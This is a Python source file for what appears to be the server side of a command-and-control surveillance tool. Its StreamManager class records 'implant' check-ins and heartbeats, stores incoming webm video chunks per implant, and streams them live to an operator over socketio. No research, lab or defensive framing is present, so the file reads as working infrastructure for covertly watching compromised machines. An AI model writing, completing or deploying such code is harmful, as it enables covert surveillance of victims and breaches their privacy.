import os
import json
import time
from collections import defaultdict

class StreamManager:
    """Manages incoming implant streams and live viewing"""

    def __init__(self, capture_dir, socketio=None):
        self.capture_dir = capture_dir
        self.socketio = socketio
        self.active_implants = {}  # implant_id -> info
        self.streams = defaultdict(list)
        self.active_streams = {} # id -> stream_name -> last_hb

    def register_checkin(self, data):
        iid = data.get("id")
        self.active_implants[iid] = {
            **data,
            "checkin_time": time.time(),
            "last_heartbeat": time.time(),
            "status": "active"
        }
        # Create capture directory
        idir = os.path.join(self.capture_dir, iid)
        os.makedirs(idir, exist_ok=True)
        return iid

    def save_chunk(self, implant_id, stream_name, chunk_data):
        idir = os.path.join(self.capture_dir, implant_id)
        os.makedirs(idir, exist_ok=True)

        ts = int(time.time() * 1000)
        ext = "webm"
        fname = f"{stream_name}_{ts}.{ext}"
        fpath = os.path.join(idir, fname)

        with open(fpath, "wb") as f:
            f.write(chunk_data)

        if self.socketio:
            import base64
            chunk_b64 = base64.b64encode(chunk_data).decode()
            self.socketio.emit("live_chunk", {
                "implant_id": implant_id,
                "stream": stream_name,
                "chunk": chunk_b64
            })

        key = (implant_id, stream_name)
        self.streams[key].append(fpath)
        return fpath

    def heartbeat(self, implant_id, stream_name):
        if implant_id in self.active_implants:
            self.active_implants[implant_id]["last_heartbeat"] = time.time()

    def get_implant_status(self, implant_id):
        return self.active_implants.get(implant_id)

    def get_latest_chunk(self, implant_id, stream_name):
        key = (implant_id, stream_name)
        chunks = self.streams.get(key, [])
        if chunks:
            return chunks[-1]
        return None

    def list_captures(self, implant_id):
        idir = os.path.join(self.capture_dir, implant_id)
        if not os.path.exists(idir):
            return []
        files = os.listdir(idir)
        return sorted(files, reverse=True)